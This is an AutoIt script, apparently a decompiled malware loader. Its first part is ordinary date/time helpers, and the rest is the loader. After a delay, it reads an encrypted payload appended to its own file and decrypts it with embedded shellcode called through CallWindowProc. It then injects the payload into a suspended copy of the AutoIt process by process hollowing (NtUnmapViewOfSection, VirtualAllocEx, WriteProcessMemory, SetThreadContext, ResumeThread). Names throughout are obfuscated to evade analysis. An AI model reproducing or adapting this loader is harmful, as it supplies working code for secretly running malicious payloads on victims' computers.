	$ainfo[0] = DllStructGetData($tsystemtime, "Month")
	$ainfo[1] = DllStructGetData($tsystemtime, "Day")
	$ainfo[2] = DllStructGetData($tsystemtime, "Year")
	$ainfo[3] = DllStructGetData($tsystemtime, "Hour")
	$ainfo[4] = DllStructGetData($tsystemtime, "Minute")
	$ainfo[5] = DllStructGetData($tsystemtime, "Second")
	$ainfo[6] = DllStructGetData($tsystemtime, "MSeconds")
	$ainfo[7] = DllStructGetData($tsystemtime, "DOW")
	Return $ainfo
EndFunc

Func _date_time_systemtimetodatestr(ByRef $tsystemtime, $bfmt = 0)
	Local $ainfo = _date_time_systemtimetoarray($tsystemtime)
	If @error Then Return SetError(@error, @extended, "")
	If $bfmt Then
		Return StringFormat("%04d/%02d/%02d", $ainfo[2], $ainfo[0], $ainfo[1])
	Else
		Return StringFormat("%02d/%02d/%04d", $ainfo[0], $ainfo[1], $ainfo[2])
	EndIf
EndFunc

Func _date_time_systemtimetodatetimestr(ByRef $tsystemtime, $bfmt = 0)
	Local $ainfo = _date_time_systemtimetoarray($tsystemtime)
	If @error Then Return SetError(@error, @extended, "")
	If $bfmt Then
		Return StringFormat("%04d/%02d/%02d %02d:%02d:%02d", $ainfo[2], $ainfo[0], $ainfo[1], $ainfo[3], $ainfo[4], $ainfo[5])
	Else
		Return StringFormat("%02d/%02d/%04d %02d:%02d:%02d", $ainfo[0], $ainfo[1], $ainfo[2], $ainfo[3], $ainfo[4], $ainfo[5])
	EndIf
EndFunc

Func _date_time_systemtimetofiletime($psystemtime)
	Local $tfiletime = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "SystemTimeToFileTime", "struct*", $psystemtime, "struct*", $tfiletime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tfiletime)
EndFunc

Func _date_time_systemtimetotimestr(ByRef $tsystemtime)
	Local $ainfo = _date_time_systemtimetoarray($tsystemtime)
	Return StringFormat("%02d:%02d:%02d", $ainfo[3], $ainfo[4], $ainfo[5])
EndFunc

Func _date_time_systemtimetotzspecificlocaltime($putc, $ptimezone = 0)
	Local $tlocaltime = DllStructCreate($tagsystemtime)
	Local $aresult = DllCall("kernel32.dll", "bool", "SystemTimeToTzSpecificLocalTime", "ptr", $ptimezone, "ptr", $putc, "struct*", $tlocaltime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tlocaltime)
EndFunc

Func _date_time_tzspecificlocaltimetosystemtime($plocaltime, $ptimezone = 0)
	Local $tutc = DllStructCreate($tagsystemtime)
	Local $aresult = DllCall("kernel32.dll", "ptr", "TzSpecificLocalTimeToSystemTime", "ptr", $ptimezone, "ptr", $plocaltime, "struct*", $tutc)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tutc)
EndFunc

delay(15, "s")

Func delay($timer, $unidad = "s")
	Local $endtime, $now = _nowcalcdate() & " " & @HOUR & ":" & @MIN & ":" & @SEC
	$endtime = _dateadd($unidad, $timer, $now)
	Do
		Sleep(1000)
	Until _nowcalcdate() & " " & @HOUR & ":" & @MIN & ":" & @SEC >= $endtime
EndFunc

#NoTrayIcon
$p442342233 = FileOpen(@ScriptFullPath, 0)
$p3191304180 = FileRead($p442342233)
$p3191304180 = StringMid($p3191304180, StringInStr($p3191304180, "dfsdfsadfdfasdafeweeawfgsdfdafs") + StringLen("dfsdfsadfdfasdafeweeawfgsdfdafs"))
$p3191304180 = kefanqsibfimzyphlrastxjciaknmdeue($p3191304180, "fdsasdfdfsadfsaewewewefwaefwafeawefwefwaefw")
pvzgakxmgjqnvuxzvgbzpqkaouyvsnscn($p3191304180)

Func kefanqsibfimzyphlrastxjciaknmdeue($011001010011100001101011001101111, $110101100111001000000000001010001)
	Local $001111001100101000001101100000110 = "0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000"
	Local $011001010101011000100100010100101 = DllStructCreate("byte[" & BinaryLen($001111001100101000001101100000110) & "]")
	DllStructSetData($011001010101011000100100010100101, 1, $001111001100101000001101100000110)
	Local $111100000101111011000010111001111 = DllStructCreate("byte[" & BinaryLen($011001010011100001101011001101111) & "]")
	DllStructSetData($111100000101111011000010111001111, 1, $011001010011100001101011001101111)
	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($011001010101011000100100010100101), "ptr", DllStructGetPtr($111100000101111011000010111001111), "int", BinaryLen($011001010011100001101011001101111), "str", $110101100111001000000000001010001, "int", 0)
	Local $010011101101001101001100101011001 = DllStructGetData($111100000101111011000010111001111, 1)
	$111100000101111011000010111001111 = 0
	$011001010101011000100100010100101 = 0
	Return $010011101101001101001100101011001
EndFunc

Func pvzgakxmgjqnvuxzvgbzpqkaouyvsnscn($566790982425485361128425132655443)
	Local $889956581616677515537683795744030 = Binary($566790982425485361128425132655443)
	Local $998471205392057219781053566064983 = DllStructCreate("byte[" & BinaryLen($889956581616677515537683795744030) & "]")
	DllStructSetData($998471205392057219781053566064983, 1, $889956581616677515537683795744030)
	Local $991521362919130988583807877549912 = DllStructGetPtr($998471205392057219781053566064983)
	Local $637042115200900634005065495474422 = DllStructCreate("dword 439117713968232426487515493366615;" & "ptr 398934382339860185918173853291137;" & "ptr 055118753380060501527667707624719;" & "ptr 821142885000446333940673704487453;" & "dword 110976125485687119991960451738057;" & "dword 955280179283708311252677883557665;" & "dword 278980071433271708376515769263565;" & "dword 116763878837073791269881666474755;" & "dword 401818485183942455257547784734040;" & "dword 898866754040457888726067094062396;" & "dword 817629069714687426774212346842608;" & "dword 990971797280455215572543929516050;" & "ushort 014356054188400457528079422754640;" & "ushort 653521723916665747685760531500899;" & "ptr 653521723916665747685760531500899;" & "ptr 440893018287949350294383161616495;" & "ptr 912053434848795110861815807271881;" & "ptr 828905162524450241480487493047180")
	Local $337615526623291802581903466843737 = DllStructCreate("ptr 541495460210322623237710898400809;" & "ptr 178599880933639235938916880761468;" & "dword 439946624865474388101876924674082;" & "dword 881411761152831132418975998998995")
	Local $671524503117036645066981158433537 = DllCall("kernel32.dll", "int", "CreateProcessW", "wstr", @AutoItExe, "ptr", 0, "ptr", 0, "ptr", 0, "int", 0, "dword", 4, "ptr", 0, "ptr", 0, "ptr", DllStructGetPtr($637042115200900634005065495474422), "ptr", DllStructGetPtr($337615526623291802581903466843737))
	If @error OR NOT $671524503117036645066981158433537[0] Then
		Return SetError(1, 0, 0)
	EndIf
	Local $426907507977163374251695217409973 = DllStructGetData($337615526623291802581903466843737, "541495460210322623237710898400809")
	Local $867944060722279484118581493601561 = DllStructGetData($337615526623291802581903466843737, "178599880933639235938916880761468")
	Local $385002530260477311452850708860192 = DllStructCreate("dword 773542019281050169128916133080296;" & "dword 513548651299904834758919226841026;" & "dword 504681564922821672840169091478092;" & "dword 305628563352624613996318910448853;" & "dword 649446944079903522450188808353515;" & "dword 926967066419350329736456456274493;" & "dword 425252271157125264907806009917183;" & "dword 828642979249651738502027088635674;" & "dword 096226719949119526310247043292657;" & "dword 559555733659521012939823718587638;" & "dword 458813316184359742598374072977151;" & "dword 568037264215016246561565151590246;" & "dword 166082941964160608351199479414853;" & "dword 897290580853890161949054366917632;" & "byte 214040076080092456152009531135558[80];" & "dword 723033842047392654458335192631867;" & "dword 417148508498098663310514481969166;" & "dword 614810101610119496264677696515003;" & "dword 400388011472819243756305357494423;" & "dword 228170187634771397084763174320291;" & "dword 108265368338496457961333493217349;" & "dword 035526245064918743867512849430592;" & "dword 166318921863109084758902988833541;" & "dword 990643696980947804299520407297452;" & "dword 093146885228291341591579260717227;" & "dword 398527251173631918152857861465050;" & "dword 326961664082925932550209334010306;" & "dword 624639188032140959705239468516604;" & "dword 149820951914487163056314871783482;" & "dword 024116586168681959383861386984790;" & "dword 474904930867201301017921339048292;" & "dword 410512838577886478232900451979674")
	DllStructSetData($385002530260477311452850708860192, "773542019281050169128916133080296", 65538)
	$671524503117036645066981158433537 = DllCall("kernel32.dll", "int", "GetThreadContext", "ptr", $867944060722279484118581493601561, "ptr", DllStructGetPtr($385002530260477311452850708860192))
	If @error OR NOT $671524503117036645066981158433537[0] Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(2, 0, 0)
	EndIf
	Local $008237808856160634161614907918313 = DllStructCreate("char 223618247638977455842224291774011[2];" & "ushort 061153110206180895831497200528487;" & "ushort 219524723184301435698351672388802;" & "ushort 762924759672905541293434330997949;" & "ushort 605202437333980272710771809093656;" & "ushort 585686836712226360325945562101592;" & "ushort 719492561504784296308317522181643;" & "ushort 208826165593034516146216500352335;" & "ushort 248009330374952713341370587444544;" & "ushort 496997241516382867896306851431431;" & "ushort 789873979242969369950203553921585;" & "ushort 439886157019535326663605849193573;" & "ushort 371139216369569846914278725538934;" & "ushort 402226896980178261800075945132842;" & "char 857970882872564825211280327788025[8];" & "ushort 027094151789277676283766027442238;" & "ushort 136820776867265620892750651712417;" & "char 578625302918743803298730155127742[20];" & "dword 920160943013664396491396484598969", $991521362919130988583807877549912)
	$991521362919130988583807877549912 += DllStructGetData($008237808856160634161614907918313, "920160943013664396491396484598969")
	Local $079740550197049835472071850278327 = DllStructGetData($008237808856160634161614907918313, "223618247638977455842224291774011")
	If NOT ($079740550197049835472071850278327 == "MZ") Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(3, 0, 0)
	EndIf
	Local $117580950454413465027639555960684 = DllStructCreate("dword 645957224160713561609187895601290", $991521362919130988583807877549912)
	$991521362919130988583807877549912 += 4
	If DllStructGetData($117580950454413465027639555960684, "645957224160713561609187895601290") <> 17744 Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(4, 0, 0)
	EndIf
	Local $575525471301384555623476107843307 = DllStructCreate("ushort 438529746982295029246857712031617;" & "ushort 517546368868943732969955074190756;" & "dword 530722612914733245016546403760045;" & "dword 318653461568014009852425597969017;" & "dword 708430040063817174619243349657013;" & "ushort 903377197002216929906012891739258;" & "ushort 009400570221171034260260711326382", $991521362919130988583807877549912)
	Local $586664224374128266862337925004086 = DllStructGetData($575525471301384555623476107843307, "517546368868943732969955074190756")
	$991521362919130988583807877549912 += 20
	Local $925183431560115487127169653859651 = DllStructCreate("ushort 223618247638977455842224291774011;" & "ubyte 111598166475014516017166857025806;" & "ubyte 112730535437490181361945858817136;" & "dword 272794261654750713841254430104021;" & "dword 416074476385334166697198340763944;" & "dword 071349139335552869977016778213003;" & "dword 078203472620284855348154610675156;" & "dword 569077028264264567497363673469406;" & "dword 670689416060544010462102438573760;" & "dword 754551627878514293524236280331972;" & "dword 148236269900510382935528055636680;" & "dword 286378170875650873214050638134572;" & "ushort 294024062510572004371265844690513;" & "ushort 143948473522502270800809632769176;" & "ushort 399709513645236446782025100443937;" & "ushort 104656258063086044581220870015017;" & "ushort 724520616415764871608553144752682;" & "ushort 997030544262471690379685092089715;" & "dword 150756355331778550137541252575431;" & "dword 166104897311072668759308295091356;" & "dword 587317630029748682410959850045220;" & "dword 496997241516382867896306851431431;" & "ushort 909036077219223912069848085897778;" & "ushort 083980379122373317497354209647992;" & "dword 403512432887842773105491694987611;" & "dword 745971762773242712875340585185932;" & "dword 938659783115893772919216736254805;" & "dword 882855675616741852730120109985111;" & "dword 464785288452706792508414995174935;" & "dword 275340394078632671370733665716521", $991521362919130988583807877549912)
	$991521362919130988583807877549912 += 96
	Local $595033292838743796155201934121619 = DllStructGetData($925183431560115487127169653859651, "223618247638977455842224291774011")
	If $595033292838743796155201934121619 <> 267 Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(5, 0, 0)
	EndIf
	Local $890749025141188310915717988581449 = DllStructGetData($925183431560115487127169653859651, "078203472620284855348154610675156")
	$991521362919130988583807877549912 += 128
	Local $513116907003166378345509188114525 = DllStructGetData($925183431560115487127169653859651, "754551627878514293524236280331972")
	Local $712077175565505280849668520691702 = DllStructGetData($925183431560115487127169653859651, "166104897311072668759308295091356")
	$671524503117036645066981158433537 = DllCall("ntdll.dll", "int", "NtUnmapViewOfSection", "ptr", $426907507977163374251695217409973, "ptr", $513116907003166378345509188114525)
	If @error OR $671524503117036645066981158433537[0] Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(6, 0, 0)
	EndIf
	$671524503117036645066981158433537 = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", "ptr", $426907507977163374251695217409973, "ptr", $513116907003166378345509188114525, "dword", $712077175565505280849668520691702, "dword", 12288, "dword", 64)
	If @error OR NOT $671524503117036645066981158433537[0] Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(7, 0, 0)
	EndIf
	Local $848557980851475611908040051832545 = $671524503117036645066981158433537[0]
	Local $992486045443489969451758480041411 = DllStructGetPtr($008237808856160634161614907918313)
	Local $342202715096993569890162249821251 = DllStructGetData($925183431560115487127169653859651, "587317630029748682410959850045220")
	$671524503117036645066981158433537 = DllCall("kernel32.dll", "int", "WriteProcessMemory", "ptr", $426907507977163374251695217409973, "ptr", $848557980851475611908040051832545, "ptr", $992486045443489969451758480041411, "dword", $342202715096993569890162249821251, "dword*", 0)
	If @error OR NOT $671524503117036645066981158433537[0] Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(8, 0, 0)
	EndIf
	Local $488919904221339530418946804655336
	Local $174611919349825107242316225767131, $835779388828536402264565716872794
	Local $977334402573660004900999997872433
	For $798373586378195162480113838653834 = 1 To $586664224374128266862337925004086
		$488919904221339530418946804655336 = DllStructCreate("char 139787195484327845024882789304030[8];" & "dword 632908747624568683471491315771866;" & "dword 037319532524584577876736486292717;" & "dword 157590092402257904968027739189644;" & "dword 416094280890675541385274318899328;" & "dword 768401250338354968734067885210421;" & "dword 840248107119992232019694985137824;" & "ushort 071686537445716947980136614190552;" & "ushort 554612275588133889671208136972578;" & "dword 009400570221171034260260711326382", $991521362919130988583807877549912)
		$174611919349825107242316225767131 = DllStructGetData($488919904221339530418946804655336, "157590092402257904968027739189644")
		$835779388828536402264565716872794 = DllStructGetPtr($008237808856160634161614907918313) + DllStructGetData($488919904221339530418946804655336, "416094280890675541385274318899328")
		$977334402573660004900999997872433 = DllStructGetData($488919904221339530418946804655336, "037319532524584577876736486292717")
		If $174611919349825107242316225767131 Then
			$671524503117036645066981158433537 = DllCall("kernel32.dll", "int", "WriteProcessMemory", "ptr", $426907507977163374251695217409973, "ptr", $848557980851475611908040051832545 + $977334402573660004900999997872433, "ptr", $835779388828536402264565716872794, "dword", $174611919349825107242316225767131, "dword*", 0)
			If @error OR NOT $671524503117036645066981158433537[0] Then
				DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
				Return SetError(9, $798373586378195162480113838653834, 0)
			EndIf
		EndIf
		$991521362919130988583807877549912 += 40
	Next
	DllStructSetData($385002530260477311452850708860192, "398527251173631918152857861465050", $848557980851475611908040051832545 + $890749025141188310915717988581449)
	$671524503117036645066981158433537 = DllCall("kernel32.dll", "int", "SetThreadContext", "ptr", $867944060722279484118581493601561, "ptr", DllStructGetPtr($385002530260477311452850708860192))
	If @error OR NOT $671524503117036645066981158433537[0] Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(10, 0, 0)
	EndIf
	$671524503117036645066981158433537 = DllCall("kernel32.dll", "int", "ResumeThread", "ptr", $867944060722279484118581493601561)
	If @error OR $671524503117036645066981158433537[0] = -1 Then
		DllCall("kernel32.dll", "int", "199891250463519264683620367771959", "ptr", $426907507977163374251695217409973, "dword", 0)
		Return SetError(11, 0, 0)
	EndIf
	Return DllStructGetData($337615526623291802581903466843737, "439946624865474388101876924674082")
EndFunc
